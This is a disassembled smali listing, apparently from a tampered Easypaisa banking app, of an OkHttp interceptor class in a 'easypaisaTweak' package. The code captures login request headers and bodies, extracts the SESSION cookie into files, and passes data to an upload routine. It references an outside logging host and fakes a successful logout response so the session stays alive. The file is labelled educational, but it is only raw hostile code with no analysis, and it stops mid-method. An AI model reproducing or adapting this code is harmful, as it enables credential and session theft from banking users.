# Source DEX: classes18.dex
# Disassembled for educational analysis

.class  Lcom/easypaisaTweak/SmaliEnterPoint$1;
.super Ljava/lang/Object;
.source "SourceFile"
.implements Lokhttp3/Interceptor;


.method public constructor Lcom/easypaisaTweak/SmaliEnterPoint$1;-><init>()V
    .registers 1
    0000: invoke-direct {v0}, Ljava/lang/Object;-><init>()V
    0003: return-void
.end method

.method private static synthetic Lcom/easypaisaTweak/SmaliEnterPoint$1;->lambda$intercept$0(Lorg/json/JSONArray;, Lorg/json/JSONArray;)V
    .registers 4
    0000: const-wide/16 v0, #1000
    0002: invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    0005: invoke-static {v2, v3}, Lcom/easypaisaTweak/WalletApp;->startUploadMeta(Lorg/json/JSONArray;, Lorg/json/JSONArray;)V
    0008: return-void
    0009: move-exception v2
    000a: new-instance v3, Ljava/lang/RuntimeException;
    000c: invoke-direct {v3, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V
    000f: throw v3
.end method

.method public static synthetic Lcom/easypaisaTweak/SmaliEnterPoint$1;->yWkiZmD(Lorg/json/JSONArray;, Lorg/json/JSONArray;)V
    .registers 2
    0000: invoke-static {v0, v1}, Lcom/easypaisaTweak/SmaliEnterPoint$1;->lambda$intercept$0(Lorg/json/JSONArray;, Lorg/json/JSONArray;)V
    0003: return-void
.end method

.method public Lcom/easypaisaTweak/SmaliEnterPoint$1;->intercept(Lokhttp3/Interceptor$Chain;)Lokhttp3/Response;
    .registers 18
    0000: invoke-interface/range {v17 .. v17}, Lokhttp3/Interceptor$Chain;->request()Lokhttp3/Request;
    0003: move-result-object v1
    0004: new-instance v0, Ljava/lang/StringBuilder;
    0006: const-string v2, '------ OkHttp Request ------\nRequest URL: '
    0008: invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    000b: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    000e: move-result-object v2
    000f: invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    0012: const-string v2, '\nMethod: '
    0014: invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0017: invoke-virtual {v1}, Lokhttp3/Request;->method()Ljava/lang/String;
    001a: move-result-object v3
    001b: invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    001e: const-string v3, '\n'
    0020: invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0023: invoke-virtual {v1}, Lokhttp3/Request;->method()Ljava/lang/String;
    0026: move-result-object v4
    0027: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    002a: move-result-object v5
    002b: invoke-virtual {v5}, Lokhttp3/Headers;->size()I
    002e: move-result v5
    002f: const-string v6, ': '
    0031: const-string v7, 'https://api.easypaisa.telenorbank.pk/security/login'
    0033: if-lez v5, 009d
    0035: const-string v5, 'Headers: \n'
    0037: invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    003a: const/4 v5, #0
    003b: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    003e: move-result-object v9
    003f: invoke-virtual {v9}, Lokhttp3/Headers;->size()I
    0042: move-result v9
    0043: if-ge v5, v9, 0064
    0045: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    0048: move-result-object v9
    0049: invoke-virtual {v9, v5}, Lokhttp3/Headers;->name(I)Ljava/lang/String;
    004c: move-result-object v9
    004d: invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0050: invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0053: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    0056: move-result-object v9
    0057: invoke-virtual {v9, v5}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    005a: move-result-object v9
    005b: invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    005e: invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0061: add-int/lit8 v5, v5, #1
    0063: goto 003b
    0064: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    0067: move-result-object v5
    0068: invoke-virtual {v5}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    006b: move-result-object v5
    006c: invoke-virtual {v5, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    006f: move-result v5
    0070: if-eqz v5, 009d
    0072: new-instance v5, Lcom/alibaba/fastjson/JSONObject;
    0074: invoke-direct {v5}, Lcom/alibaba/fastjson/JSONObject;-><init>()V
    0077: const/4 v9, #0
    0078: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    007b: move-result-object v10
    007c: invoke-virtual {v10}, Lokhttp3/Headers;->size()I
    007f: move-result v10
    0080: if-ge v9, v10, 0098
    0082: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    0085: move-result-object v10
    0086: invoke-virtual {v10, v9}, Lokhttp3/Headers;->name(I)Ljava/lang/String;
    0089: move-result-object v10
    008a: invoke-virtual {v1}, Lokhttp3/Request;->headers()Lokhttp3/Headers;
    008d: move-result-object v11
    008e: invoke-virtual {v11, v9}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    0091: move-result-object v11
    0092: invoke-virtual {v5, v10, v11}, Lcom/alibaba/fastjson/JSONObject;->put(Ljava/lang/String;, Ljava/lang/Object;)Ljava/lang/Object;
    0095: add-int/lit8 v9, v9, #1
    0097: goto 0078
    0098: const-string v9, 'httpHeaderXLemon.json'
    009a: invoke-static {v5, v9}, Lcom/easypaisaTweak/WalletApp;->saveJSONObjectToFile(Lcom/alibaba/fastjson/JSONObject;, Ljava/lang/String;)V
    009d: invoke-virtual {v1}, Lokhttp3/Request;->body()Lokhttp3/RequestBody;
    00a0: move-result-object v5
    00a1: if-eqz v5, 00cb
    00a3: new-instance v9, Lokio/Buffer;
    00a5: invoke-direct {v9}, Lokio/Buffer;-><init>()V
    00a8: invoke-virtual {v5, v9}, Lokhttp3/RequestBody;->writeTo(Lokio/BufferedSink;)V
    00ab: invoke-virtual {v9}, Lokio/Buffer;->readUtf8()Ljava/lang/String;
    00ae: move-result-object v5
    00af: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    00b2: move-result-object v9
    00b3: invoke-virtual {v9}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    00b6: move-result-object v9
    00b7: invoke-virtual {v9, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    00ba: move-result v9
    00bb: if-eqz v9, 00c0
    00bd: invoke-static {v5}, LsyncMeta/SyncMeta;->setEasypaisaLoginBody(Ljava/lang/String;)V
    00c0: const-string v9, 'Request Body: '
    00c2: invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    00c5: invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    00c8: invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    00cb: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    00ce: move-result-object v5
    00cf: invoke-virtual {v5}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    00d2: move-result-object v5
    00d3: const-string v9, 'log-bg.rushsms.xyz'
    00d5: invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    00d8: move-result v5
    00d9: const-string v10, 'EasypaisaTweak'
    00db: const-string v11, 'localhost'
    00dd: if-nez v5, 00fb
    00df: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    00e2: move-result-object v5
    00e3: invoke-virtual {v5}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    00e6: move-result-object v5
    00e7: invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    00ea: move-result v5
    00eb: if-nez v5, 00fb
    00ed: invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    00f0: move-result-object v5
    00f1: invoke-static {v10, v5}, Landroid/util/Log;->i(Ljava/lang/String;, Ljava/lang/String;)I
    00f4: invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    00f7: move-result-object v0
    00f8: invoke-static {v0}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    00fb: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    00fe: move-result-object v0
    00ff: invoke-virtual {v0}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    0102: move-result-object v0
    0103: const-string v5, '/security/logout'
    0105: invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    0108: move-result v0
    0109: const-string v5, ''
    010b: if-eqz v0, 01bf
    010d: new-instance v0, Ljava/lang/StringBuilder;
    010f: const-string v4, '{"requestId":"AGW'
    0111: invoke-direct {v0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    0114: invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    0117: move-result-wide v6
    0118: invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    011b: const-string v4, '","msgId":null,"accDate":null,"startDateTime":null,"locale":null,"routeInfo":null,"userId":null,"clientIp":null,"source":null,"channel":null,"business":null,"uri":null,"token":null,"loginName":null,"selectedSOF":null,"body":null,"msgCd":"AGW00000","msgInfo":null}'
    011d: invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0120: invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0123: move-result-object v0
    0124: new-instance v4, Lokhttp3/Response$Builder;
    0126: invoke-direct {v4}, Lokhttp3/Response$Builder;-><init>()V
    0129: invoke-virtual {v4, v1}, Lokhttp3/Response$Builder;->request(Lokhttp3/Request;)Lokhttp3/Response$Builder;
    012c: move-result-object v4
    012d: sget-object v6, Lokhttp3/Protocol;->HTTP_1_1:Lokhttp3/Protocol;
    012f: invoke-virtual {v4, v6}, Lokhttp3/Response$Builder;->protocol(Lokhttp3/Protocol;)Lokhttp3/Response$Builder;
    0132: move-result-object v4
    0133: const/16 v6, #200
    0135: invoke-virtual {v4, v6}, Lokhttp3/Response$Builder;->code(I)Lokhttp3/Response$Builder;
    0138: move-result-object v4
    0139: const-string v6, 'OK'
    013b: invoke-virtual {v4, v6}, Lokhttp3/Response$Builder;->message(Ljava/lang/String;)Lokhttp3/Response$Builder;
    013e: move-result-object v4
    013f: const-string v6, 'Content-Type'
    0141: const-string v7, 'text/html;charset=UTF-8'
    0143: invoke-virtual {v4, v6, v7}, Lokhttp3/Response$Builder;->header(Ljava/lang/String;, Ljava/lang/String;)Lokhttp3/Response$Builder;
    0146: move-result-object v4
    0147: const-string v6, 'x-auth-token'
    0149: invoke-virtual {v1, v6}, Lokhttp3/Request;->header(Ljava/lang/String;)Ljava/lang/String;
    014c: move-result-object v8
    014d: if-nez v8, 0150
    014f: goto 0154
    0150: invoke-virtual {v1, v6}, Lokhttp3/Request;->header(Ljava/lang/String;)Ljava/lang/String;
    0153: move-result-object v5
    0154: invoke-virtual {v4, v6, v5}, Lokhttp3/Response$Builder;->header(Ljava/lang/String;, Ljava/lang/String;)Lokhttp3/Response$Builder;
    0157: move-result-object v4
    0158: invoke-static {v7}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;
    015b: move-result-object v5
    015c: invoke-static {v5, v0}, Lokhttp3/ResponseBody;->create(Lokhttp3/MediaType;, Ljava/lang/String;)Lokhttp3/ResponseBody;
    015f: move-result-object v5
    0160: invoke-virtual {v4, v5}, Lokhttp3/Response$Builder;->body(Lokhttp3/ResponseBody;)Lokhttp3/Response$Builder;
    0163: move-result-object v4
    0164: invoke-virtual {v4}, Lokhttp3/Response$Builder;->build()Lokhttp3/Response;
    0167: move-result-object v4
    0168: new-instance v5, Ljava/lang/StringBuilder;
    016a: const-string v6, '------ OkHttp Response ------\nURL: '
    016c: invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    016f: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    0172: move-result-object v6
    0173: invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    0176: invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0179: invoke-virtual {v1}, Lokhttp3/Request;->method()Ljava/lang/String;
    017c: move-result-object v1
    017d: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0180: const-string v1, '\nStatus Code: '
    0182: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0185: invoke-virtual {v4}, Lokhttp3/Response;->code()I
    0188: move-result v1
    0189: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    018c: const-string v1, '\nTime: 0 ms (faked, no network)\nContentType: '
    018e: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0191: invoke-virtual {v4}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0194: move-result-object v1
    0195: invoke-virtual {v1}, Lokhttp3/ResponseBody;->contentType()Lokhttp3/MediaType;
    0198: move-result-object v1
    0199: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    019c: const-string v1, '\nContentLength: '
    019e: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01a1: invoke-virtual {v4}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    01a4: move-result-object v1
    01a5: invoke-virtual {v1}, Lokhttp3/ResponseBody;->contentLength()J
    01a8: move-result-wide v1
    01a9: invoke-virtual {v5, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    01ac: const-string v1, '\nHeaders:\ncontent-type: text/html;charset=UTF-8\nResponse Body:\n'
    01ae: invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01b1: invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01b4: invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01b7: invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    01ba: move-result-object v0
    01bb: invoke-static {v0}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    01be: return-object v4
    01bf: invoke-static {}, Ljava/lang/System;->nanoTime()J
    01c2: move-result-wide v12
    01c3: move-object/from16 v0, v17
    01c5: invoke-interface {v0, v1}, Lokhttp3/Interceptor$Chain;->proceed(Lokhttp3/Request;)Lokhttp3/Response;
    01c8: move-result-object v2
    01c9: invoke-static {}, Ljava/lang/System;->nanoTime()J
    01cc: move-result-wide v14
    01cd: .unknown-op 0xbc
    01ce: long-to-double v12, v14
    01cf: const-wide v14, #4696837146684686336L
    01d4: .unknown-op 0xce
    01d5: new-instance v14, Ljava/lang/StringBuilder;
    01d7: invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V
    01da: const-string v0, '------ OkHttp Response ------\n'
    01dc: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01df: const-string v0, 'URL: '
    01e1: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01e4: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    01e7: move-result-object v0
    01e8: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    01eb: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01ee: const-string v0, 'Method: '
    01f0: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01f3: invoke-virtual {v1}, Lokhttp3/Request;->method()Ljava/lang/String;
    01f6: move-result-object v0
    01f7: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01fa: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    01fd: const-string v0, 'Status Code: '
    01ff: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0202: invoke-virtual {v2}, Lokhttp3/Response;->code()I
    0205: move-result v0
    0206: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    0209: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    020c: const-string v0, 'Time: '
    020e: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0211: invoke-virtual {v14, v12, v13}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;
    0214: const-string v0, ' ms\n'
    0216: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0219: const-string v0, 'ContentType: '
    021b: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    021e: invoke-virtual {v2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0221: move-result-object v0
    0222: invoke-virtual {v0}, Lokhttp3/ResponseBody;->contentType()Lokhttp3/MediaType;
    0225: move-result-object v0
    0226: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    0229: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    022c: const-string v0, 'ContentLength: '
    022e: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0231: invoke-virtual {v2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0234: move-result-object v0
    0235: invoke-virtual {v0}, Lokhttp3/ResponseBody;->contentLength()J
    0238: move-result-wide v12
    0239: invoke-virtual {v14, v12, v13}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    023c: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    023f: const-string v0, 'Headers:\n'
    0241: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0244: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    0247: move-result-object v0
    0248: invoke-virtual {v0}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    024b: move-result-object v0
    024c: invoke-virtual {v0, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    024f: move-result v0
    0250: if-eqz v0, 02aa
    0252: new-instance v0, Lcom/alibaba/fastjson/JSONObject;
    0254: invoke-direct {v0}, Lcom/alibaba/fastjson/JSONObject;-><init>()V
    0257: const/4 v13, #0
    0258: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    025b: move-result-object v15
    025c: invoke-virtual {v15}, Lokhttp3/Headers;->size()I
    025f: move-result v15
    0260: if-ge v13, v15, 02a5
    0262: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    0265: move-result-object v15
    0266: invoke-virtual {v15, v13}, Lokhttp3/Headers;->name(I)Ljava/lang/String;
    0269: move-result-object v15
    026a: const-string v12, 'set-cookie'
    026c: invoke-virtual {v15, v12}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    026f: move-result v12
    0270: if-eqz v12, 02a2
    0272: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    0275: move-result-object v12
    0276: invoke-virtual {v12, v13}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    0279: move-result-object v12
    027a: const-string v15, 'SESSION='
    027c: invoke-virtual {v12, v15}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    027f: move-result v12
    0280: if-eqz v12, 02a2
    0282: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    0285: move-result-object v12
    0286: invoke-virtual {v12, v13}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    0289: move-result-object v12
    028a: const-string v15, ';'
    028c: const/4 v8, #2
    028d: invoke-virtual {v12, v15, v8}, Ljava/lang/String;->split(Ljava/lang/String;, I)[Ljava/lang/String;
    0290: move-result-object v12
    0291: const/4 v15, #0
    0292: aget-object v12, v12, v15
    0294: const-string v15, '='
    0296: invoke-virtual {v12, v15, v8}, Ljava/lang/String;->split(Ljava/lang/String;, I)[Ljava/lang/String;
    0299: move-result-object v8
    029a: const/4 v12, #1
    029b: aget-object v8, v8, v12
    029d: const-string v12, 'sessionId'
    029f: invoke-virtual {v0, v12, v8}, Lcom/alibaba/fastjson/JSONObject;->put(Ljava/lang/String;, Ljava/lang/Object;)Ljava/lang/Object;
    02a2: add-int/lit8 v13, v13, #1
    02a4: goto 0258
    02a5: const-string v8, 'session.json'
    02a7: invoke-static {v0, v8}, Lcom/easypaisaTweak/WalletApp;->saveJSONObjectToFile(Lcom/alibaba/fastjson/JSONObject;, Ljava/lang/String;)V
    02aa: const/4 v0, #0
    02ab: const/4 v15, #0
    02ac: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    02af: move-result-object v8
    02b0: invoke-virtual {v8}, Lokhttp3/Headers;->size()I
    02b3: move-result v8
    02b4: if-ge v15, v8, 02f6
    02b6: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    02b9: move-result-object v8
    02ba: invoke-virtual {v8, v15}, Lokhttp3/Headers;->name(I)Ljava/lang/String;
    02bd: move-result-object v8
    02be: invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    02c1: invoke-virtual {v14, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    02c4: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    02c7: move-result-object v8
    02c8: invoke-virtual {v8, v15}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    02cb: move-result-object v8
    02cc: invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    02cf: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    02d2: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    02d5: move-result-object v8
    02d6: invoke-virtual {v8, v15}, Lokhttp3/Headers;->name(I)Ljava/lang/String;
    02d9: move-result-object v8
    02da: const-string v12, 'content-encoding'
    02dc: invoke-virtual {v8, v12}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    02df: move-result v8
    02e0: if-eqz v8, 02f3
    02e2: invoke-virtual {v2}, Lokhttp3/Response;->headers()Lokhttp3/Headers;
    02e5: move-result-object v8
    02e6: invoke-virtual {v8, v15}, Lokhttp3/Headers;->value(I)Ljava/lang/String;
    02e9: move-result-object v8
    02ea: const-string v12, 'gzip'
    02ec: invoke-virtual {v8, v12}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    02ef: move-result v8
    02f0: if-eqz v8, 02f3
    02f2: const/4 v0, #1
    02f3: add-int/lit8 v15, v15, #1
    02f5: goto 02ac
    02f6: if-eqz v0, 0342
    02f8: invoke-virtual {v2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    02fb: move-result-object v0
    02fc: if-eqz v0, 037a
    02fe: invoke-virtual {v0}, Lokhttp3/ResponseBody;->contentType()Lokhttp3/MediaType;
    0301: move-result-object v6
    0302: if-eqz v6, 037a
    0304: invoke-virtual {v0}, Lokhttp3/ResponseBody;->source()Lokio/BufferedSource;
    0307: move-result-object v0
    0308: invoke-interface {v0}, Lokio/BufferedSource;->readByteArray()[B
    030b: move-result-object v0
    030c: new-instance v5, Lokio/Buffer;
    030e: invoke-direct {v5}, Lokio/Buffer;-><init>()V
    0311: invoke-virtual {v5, v0}, Lokio/Buffer;->write([B)Lokio/Buffer;
    0314: move-result-object v5
    0315: new-instance v8, Lokio/GzipSource;
    0317: invoke-direct {v8, v5}, Lokio/GzipSource;-><init>(Lokio/Source;)V
    031a: new-instance v5, Lokio/Buffer;
    031c: invoke-direct {v5}, Lokio/Buffer;-><init>()V
    031f: invoke-virtual {v5, v8}, Lokio/Buffer;->writeAll(Lokio/Source;)J
    0322: invoke-virtual {v5}, Lokio/Buffer;->readUtf8()Ljava/lang/String;
    0325: move-result-object v5
    0326: const-string v8, 'Response unzip Body:\n'
    0328: invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    032b: invoke-virtual {v14, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    032e: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0331: invoke-virtual {v2}, Lokhttp3/Response;->newBuilder()Lokhttp3/Response$Builder;
    0334: move-result-object v3
    0335: invoke-static {v6, v0}, Lokhttp3/ResponseBody;->create(Lokhttp3/MediaType;, [B)Lokhttp3/ResponseBody;
    0338: move-result-object v0
    0339: invoke-virtual {v3, v0}, Lokhttp3/Response$Builder;->body(Lokhttp3/ResponseBody;)Lokhttp3/Response$Builder;
    033c: move-result-object v0
    033d: invoke-virtual {v0}, Lokhttp3/Response$Builder;->build()Lokhttp3/Response;
    0340: move-result-object v2
    0341: goto 037a
    0342: invoke-virtual {v2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    0345: move-result-object v0
    0346: if-eqz v0, 037a
    0348: invoke-virtual {v0}, Lokhttp3/ResponseBody;->contentType()Lokhttp3/MediaType;
    034b: move-result-object v6
    034c: if-eqz v6, 037a
    034e: invoke-virtual {v6}, Lokhttp3/MediaType;->toString()Ljava/lang/String;
    0351: move-result-object v8
    0352: const-string v12, 'application/json'
    0354: invoke-virtual {v8, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    0357: move-result v8
    0358: if-eqz v8, 037a
    035a: invoke-virtual {v0}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;
    035d: move-result-object v5
    035e: const-string v0, 'Response Body:\n'
    0360: invoke-virtual {v14, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0363: invoke-virtual {v14, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0366: invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    0369: invoke-virtual {v2}, Lokhttp3/Response;->newBuilder()Lokhttp3/Response$Builder;
    036c: move-result-object v0
    036d: invoke-static {v6, v5}, Lokhttp3/ResponseBody;->create(Lokhttp3/MediaType;, Ljava/lang/String;)Lokhttp3/ResponseBody;
    0370: move-result-object v3
    0371: invoke-virtual {v0, v3}, Lokhttp3/Response$Builder;->body(Lokhttp3/ResponseBody;)Lokhttp3/Response$Builder;
    0374: move-result-object v0
    0375: invoke-virtual {v0}, Lokhttp3/Response$Builder;->build()Lokhttp3/Response;
    0378: move-result-object v0
    0379: move-object v2, v0
    037a: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    037d: move-result-object v0
    037e: invoke-virtual {v0}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    0381: move-result-object v0
    0382: invoke-virtual {v0, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    0385: move-result v0
    0386: if-eqz v0, 0407
    0388: invoke-static {v5}, Lcom/alibaba/fastjson/JSONObject;->parseObject(Ljava/lang/String;)Lcom/alibaba/fastjson/JSONObject;
    038b: move-result-object v0
    038c: const-string v3, 'body'
